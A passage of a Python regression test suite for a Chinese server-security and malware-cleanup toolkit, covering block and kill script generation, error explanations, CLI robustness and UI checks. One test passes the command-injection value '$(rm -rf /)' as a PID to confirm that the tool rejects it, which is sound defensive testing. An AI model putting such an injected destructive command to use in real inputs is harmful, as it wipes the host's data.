    check("block：非法输入被拒收", r.get("rejected") == ["not-an-ip"], str(r))
    if r.get("ok"):
        shp = next(s for s in r["scripts"] if s.endswith(".sh"))
        check("block：sh 无 BOM",
              not Path(shp).read_bytes().startswith(b"\xef\xbb\xbf"), "")
        rc = subprocess.run(["sh", "-n", shp], capture_output=True, timeout=30)
        check("block：sh 语法通过", rc.returncode == 0,
              rc.stderr.decode("utf-8", "replace")[:80])
    r = malware.build_block(["只给非法输入"])
    check("block：全非法输入直接报错", not r.get("ok"), str(r))

    r = malware.build_kill("1234", mode="suspend")
    check("kill：PID 挂起脚本生成", r.get("ok"), str(r))
    if r.get("ok"):
        ps1 = next(s for s in r["scripts"] if s.endswith(".ps1"))
        check("kill：suspend 脚本含 NtSuspendProcess",
              "NtSuspendProcess" in Path(ps1).read_text(encoding="utf-8"), "")
        check("kill：ps1 带 BOM",
              Path(ps1).read_bytes().startswith(b"\xef\xbb\xbf"), "")
    r = malware.build_kill("$(rm -rf /)", mode="kill")
    check("kill：注入类输入被拒收", not r.get("ok"), str(r))
    r = malware.build_kill("1234", mode="kill")
    check("kill：kill 模式含 Stop-Process / kill",
          any("Stop-Process" in Path(s).read_text(encoding="utf-8")
              for s in r["scripts"] if s.endswith(".ps1")), str(r))

    # ---- 渲染 ----
    txt = malware.render_hits([
        malware.Hit(id="A", title="低", level="LOW"),
        malware.Hit(id="B", title="高", level="CRITICAL"),
    ])
    check("render_hits：高危排在前", txt.index("高") < txt.index("低"), "")


# --------------------------------------------------------------------------

def test_errors_layer() -> None:
    """错误处理层：能不能把异常翻译成人话、能不能留痕、会不会自己崩。"""
    section("errors · 统一错误处理层")
    import errors as E

    # ---- 1. 常见异常的「原因」判定 ----
    cause, hint, certain = E.explain(PermissionError(13, "Permission denied"))
    check("权限不足：原因说清了", "权限" in cause, cause)
    check("权限不足：给了处理办法", bool(hint), hint)
    cause, _hint, _c = E.explain(FileNotFoundError(2, "No such file"))
    check("路径不存在：原因正确", "不存在" in cause, cause)
    cause, _hint, _c = E.explain(TimeoutError("timed out"))
    check("超时：原因正确", "超时" in cause, cause)
    import json as _json

    cause, _hint, _c = E.explain(_json.JSONDecodeError("x", "y", 0))
    check("JSON 损坏：原因正确", "JSON" in cause, cause)
    import subprocess as _sp

    cause, _hint, _c = E.explain(_sp.TimeoutExpired(cmd="ping", timeout=5))
    check("命令超时：原因含秒数", "5" in cause, cause)

    # Windows 错误码（10048=端口被占用）要能认出来
    e = OSError("占用")
    try:
        e.winerror = 10048  # type: ignore[attr-defined]
    except Exception:  # noqa: BLE001
        pass
    cause, _hint, _c = E.explain(e)
    check("winerror 10048 识别为端口占用", "端口" in cause, cause)

    # ---- 2. 业务性中文异常不应被当成"程序内部问题" ----
    cause, _hint, certain = E.explain(ValueError("找不到扫描结果文件，请重新扫描"))
    check("中文业务异常：原话被当作原因", "找不到扫描结果" in cause, cause)
    check("中文业务异常：标为确定", certain is True, str(certain))
    cause, _hint, certain = E.explain(ValueError("invalid literal for int()"))
    check("英文内部异常：标为推测", certain is False, str(certain))

    # ---- 3. 主动抛出的 OpsError 原样带出原因与建议 ----
    oe = E.OpsError("命令失败", cause="端口被占用", hint="换端口", context="net")
    cause, hint, _c = E.explain(oe)
    check("OpsError：原因原样带出", cause == "端口被占用", cause)
    check("OpsError：建议原样带出", hint == "换端口", hint)

    # ---- 4. 退出码解释 ----
    check("rc=0 成功", E.explain_rc(0)[0] == "成功", "")
    check("rc=127 命令不存在", "不存在" in E.explain_rc(127)[0], E.explain_rc(127)[0])
    check("rc=255 SSH 失败", "SSH" in E.explain_rc(255)[0], E.explain_rc(255)[0])
    check("rc=1 通用错误有建议", bool(E.explain_rc(1)[1]), "")
    check("rc=2 stderr 里的权限被识别",
          "权限" in E.explain_rc(2, "Permission denied")[0],
          E.explain_rc(2, "Permission denied")[0])

    # ---- 5. 渲染：四段内容齐全，且不抛异常 ----
    info = E.diagnose(PermissionError(13, "拒绝访问"), context="harden apply")
    txt = E.render(info, color=False)
    for key in ("【原因", "【处理】", "【影响】", "【日志】"):
        check(f"渲染包含 {key}", key in txt, "")
    check("变更类场景的影响提示正确",
          "会改系统" in info["impact"], info["impact"])
    check("只读场景的影响提示正确",
          "只读" in E.diagnose(ValueError("x"), context="audit").get("impact", ""), "")
    # 各种奇怪对象都不能把渲染搞崩
    for weird in (Exception(), KeyboardInterrupt(), SystemExit(1),
                  Exception(""),
                  type("R", (Exception,), {"__str__": lambda self: (_ for _ in ()).throw(
                      RuntimeError("炸"))})()):
        try:
            E.one_line(weird)
            E.render(E.diagnose(weird), color=False)
            ok = True
        except Exception:  # noqa: BLE001
            ok = False
        check(f"渲染不崩：{type(weird).__name__}", ok, "")

    # ---- 6. 落盘 / 读取 / 清理（用临时目录，不碰真实日志） ----
    with tempfile.TemporaryDirectory() as td:
        old = E.LOG_DIR
        try:
            E.LOG_DIR = Path(td) / "logs"
            try:
                raise RuntimeError("测试用错误")
            except RuntimeError as _e:   # 真抛一次，才有真实堆栈可存
                info = E.record(_e, context="selftest")
            p = Path(info["log"])
            check("错误日志已落盘", p.is_file(), str(p))
            got = E.read_log(limit=5)
            check("日志可读回", bool(got) and got[0]["type"] == "RuntimeError", str(got[:1]))
            check("日志含原因与建议", bool(got[0]["cause"]) and bool(got[0]["hint"]), "")
            check("日志含完整堆栈", "Traceback" in got[0]["traceback"], "")
            check("recent() 记录了内存副本", any(x["type"] == "RuntimeError"
                                                for x in E.recent()), "")
            check("日志文件统计可用", E.log_files()[0]["entries"] >= 1, str(E.log_files()))
            n = E.clear_log()
            check("清空日志成功", n >= 1 and not E.read_log(), str(n))
            # 坏行不能让读取崩掉
            lp = E.log_path()
            lp.parent.mkdir(parents=True, exist_ok=True)
            lp.write_text("{这不是合法 JSON}\n", encoding="utf-8")
            check("坏日志行被跳过、不抛异常", E.read_log() == [], "")
        finally:
            E.LOG_DIR = old

    # ---- 7. guard / attempt 包装器 ----
    @E.guard(context="selftest-guard", default="降级值")
    def _boom():
        raise RuntimeError("包装器测试")

    check("guard：异常不外溢，返回默认值", _boom() == "降级值", "")
    ok_flag, res, info2 = E.attempt(lambda: 1 / 0, context="selftest-attempt")
    check("attempt：返回 (False, None, info)",
          ok_flag is False and res is None and info2 is not None, "")
    ok_flag, res, _ = E.attempt(lambda: 42, context="selftest-attempt")
    check("attempt：正常路径原样返回", ok_flag is True and res == 42, "")


def test_cli_resilience() -> None:
    """入口不崩：参数错、文件缺、模块坏，都要有出口码而不是 traceback。"""
    section("cli · 出错不崩（回归）")
    import cli

    code = cli.main(["nosuchcmd"])
    check("未知子命令：返回非 0（不抛异常）", code not in (0, None), str(code))

    # 用不存在的文件触发业务失败路径
    code = cli.main(["report", str(Path(tempfile.gettempdir()) / "绝对不存在的报告.json")])
    check("report 输入缺失：返回 1", code == 1, str(code))

    code = cli.main(["clean", "restore", "--batch",
                     str(Path(tempfile.gettempdir()) / "绝不存在的隔离批次")])
    check("clean restore 批次不存在：有出口码、不崩", isinstance(code, int), str(code))

    code = cli.main(["--help"]) if False else cli.main(["doctor", "--json"])
    check("doctor --json 正常返回 0", code == 0, str(code))

    code = cli.main(["errors", "--last", "1"])
    check("errors 子命令可用", code == 0, str(code))

    # 兜底出口：强行让子命令抛未预期异常，应被翻译成"人话"而不是 traceback
    import io
    import contextlib

    buf = io.StringIO()
    parser = cli.build_parser()
    args = parser.parse_args(["doctor"])

    def _boom(_args):
        raise ZeroDivisionError("division by zero")

    args.func = _boom
    real_parse = cli.build_parser

    class _FakeParser:
        def parse_args(self, *_a, **_kw):
            return args

        def print_help(self, *_a, **_kw):
            pass

    with contextlib.redirect_stdout(buf):
        cli.build_parser = lambda: _FakeParser()  # type: ignore[assignment]
        try:
            code = cli.main([])
        finally:
            cli.build_parser = real_parse  # type: ignore[assignment]
    out = buf.getvalue()
    check("未预期异常：退出码为 2", code == 2, str(code))
    check("未预期异常：输出中文原因/处理/影响",
          "【原因" in out and "【处理】" in out and "【影响】" in out, out[-300:])
    check("未预期异常：输出里没有 Traceback", "Traceback" not in out, "")


def test_ui_assets() -> None:
    """控制台静态资源 + 响应头：这两个地方曾经真的把界面搞挂过，必须回归。"""
    section("ui · 控制台（回归）")
    import ui

    # 1) Server 响应头必须是 ASCII —— 标准库用 latin-1 严格编码写响应头，
    #    一旦出现中文，每个请求都会在发响应头时抛异常，控制台表现为"无任何响应"
    ver = ui.Handler.server_version
    try:
        ver.encode("latin-1")
        ascii_ok = all(ord(c) < 128 for c in ver)
    except UnicodeEncodeError:
        ascii_ok = False
    check("server_version 为纯 ASCII（否则整个控制台无响应）", ascii_ok, ver)
    vs = ui.Handler.version_string(ui.Handler)
    try:
        vs.encode("latin-1")
        vs_ok = True
    except UnicodeEncodeError:
        vs_ok = False
    check("version_string() 也能被 latin-1 编码", vs_ok, vs)

    # 2) 路由有兜底包装
    check("do_GET 有异常兜底（_route 包装）",
          getattr(ui.Handler.do_GET, "__wrapped__", None) is not None, "")
    check("do_POST 有异常兜底（_route 包装）",
          getattr(ui.Handler.do_POST, "__wrapped__", None) is not None, "")
    check("服务端有 handle_error 覆写（内部异常只记日志，不刷屏）",
          ui.ConsoleServer.handle_error is not ui.ThreadingHTTPServer.__dict__.get(
              "handle_error", object), "")

    # 3) 界面文件：脚本能解析、错误展示元素在、新页签在
    html = (Path(__file__).resolve().parent.parent / "assets" / "ui.html").read_text(
        encoding="utf-8")
    check("界面含错误提示条元素", 'id="errbar"' in html, "")
    check("界面含错误日志页签", 'id="tab-errors"' in html, "")
    check("界面含 showApiError 定义", "function showApiError" in html, "")
    check("界面含 /api/errors 调用", "/api/errors" in html, "")
    check("界面里没有残留的裸 toast(r.error)", "toast(r.error)" not in html, "")

    i, j = html.index("<script>") + len("<script>"), html.rindex("</script>")
    js = html[i:j]
    check("界面脚本反引号成对（曾因一个错引号导致整个脚本失效）",
          js.count("`") % 2 == 0, f"count={js.count('`')}")

    node = shutil.which("node")
    if node:
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "ui.js"
            p.write_text(js, encoding="utf-8")
            rc = subprocess.run([node, "--check", str(p)], capture_output=True, timeout=60)
            check("界面脚本语法通过（node --check）", rc.returncode == 0,
                  rc.stderr.decode("utf-8", "replace")[:200])
    else:
        check("界面脚本语法检查（跳过：本机没有 node）", True, "")


def test_generated_script_error_handling() -> None:
    """生成的处置脚本必须自带错误捕获与原因说明（这是用户直接执行的东西）。"""
    section("生成脚本 · 出错报原因（回归）")
    import harden
    import net as netmod

    with tempfile.TemporaryDirectory() as td:
        r = harden.generate_scripts("baseline", platform="nix", out_dir=str(Path(td) / "hn"))
        sh = Path(r["apply_script"]).read_text(encoding="utf-8")
        check("加固 sh：动作被子 shell 隔离（set -e + if !）",
              "if ! ( set -e" in sh and "); then" in sh, "")
        check("加固 sh：失败时打印原因与处理", "原因：多为权限不足" in sh, "")
        check("加固 sh：结尾有失败汇总与退出码", "ND_FAILED" in sh and "exit 2" in sh, "")
        check("加固 sh：语法通过", subprocess.run(
            ["sh", "-n", r["apply_script"]], capture_output=True).returncode == 0, "")

        r2 = harden.generate_scripts("baseline", platform="win", out_dir=str(Path(td) / "hw"))
        ps = Path(r2["apply_script"]).read_text(encoding="utf-8-sig")
        check("加固 ps1：每个动作独立 try/catch", "Apply-Step" in ps and "catch {" in ps, "")
        check("加固 ps1：失败原因写清楚", "未生效" in ps and "处理：" in ps, "")
        check("加固 ps1：非管理员直接给出原因与处理",
              "需要以管理员身份运行" in ps and "处理：开始菜单搜 PowerShell" in ps, "")
        check("加固 ps1：结尾汇总 + exit 2", "$ND_FAILED" in ps and "exit 2" in ps, "")

        r3 = netmod.generate_tune_scripts("nix", out_dir=str(Path(td) / "nn"))
        nsh = Path(r3["apply_script"]).read_text(encoding="utf-8")
        check("提速 sh：动作被隔离且语法通过",
              "if ! ( set -e" in nsh and subprocess.run(
                  ["sh", "-n", r3["apply_script"]], capture_output=True).returncode == 0, "")
        check("提速 sh：Linux 脚本不再引用 PowerShell 验证命令",
              "Get-DnsClientServerAddress" not in nsh, "")

    import malware

    with tempfile.TemporaryDirectory():
        b = malware.build_block(["192.0.2.1"])
        bsh = Path(b["scripts"][1]).read_text(encoding="utf-8")
        check("阻断 sh：检查 root 与 iptables 并给出原因",
              "需要 root" in bsh and "找不到 iptables" in bsh, "")
        check("阻断 sh：逐个地址失败有原因、有汇总", "未生效" in bsh and "exit 2" in bsh, "")
        bps = Path(b["scripts"][0]).read_text(encoding="utf-8-sig")
        check("阻断 ps1：逐个地址 try/catch 且给原因", "catch {" in bps and "原因：" in bps, "")

        k = malware.build_kill("1234", mode="kill")
        kps = Path(k["scripts"][0]).read_text(encoding="utf-8-sig")
        check("进程处置 ps1：找不到进程时报原因", "找不到 PID" in kps, "")
        check("进程处置 ps1：失败时报原因与处理", "catch {" in kps and "处理：" in kps, "")
        ksh = Path(k["scripts"][1]).read_text(encoding="utf-8")
        check("进程处置 sh：失败时报原因", "无法结束 PID" in ksh and "原因：" in ksh, "")

    import backup as bk

    with tempfile.TemporaryDirectory() as td:
        p = bk.generate_schedule("D:/ops-backups", ["C:/data"], keep=7, hour=3,
                                 script_out=str(Path(td) / "bk.sh"))
        s = Path(p).read_text(encoding="utf-8")
        check("定时备份脚本：检查 python 是否存在并说明原因",
              "找不到" in s and "原因：" in s, "")
        check("定时备份脚本：备份失败/校验失败分开报错",
              "备份失败" in s and "校验未通过" in s, "")


# --------------------------------------------------------------------------

ALL = [
    test_common, test_parse, test_linux_rules, test_plan_and_report,
    test_backup, test_harden, test_agent_script,
    test_script_encoding, test_clean, test_net, test_hunt,
    test_errors_layer, test_cli_resilience, test_ui_assets,
    test_generated_script_error_handling,
]


def main(verbose: bool = True) -> int:
    print("\033[1m服务器安全维护、杀木马病毒skill 自检回归\033[0m")
    print("\033[90m（全部使用合成数据，不会改动本机任何设置）\033[0m")
    for fn in ALL:
        try:
            fn()
        except Exception:  # noqa: BLE001
            global FAIL
            FAIL += 1
            FAILURES.append(f"{fn.__name__} 抛异常")
            print(f"  \033[31m✗ {fn.__name__} 抛异常\033[0m")
            traceback.print_exc()
    print()
    print(f"\033[1m结果：通过 {PASS} · 失败 {FAIL}\033[0m")
    if FAILURES:
        print("\033[31m失败项：\033[0m")
        for x in FAILURES:
            print(f"  · {x}")
    return 0 if FAIL == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
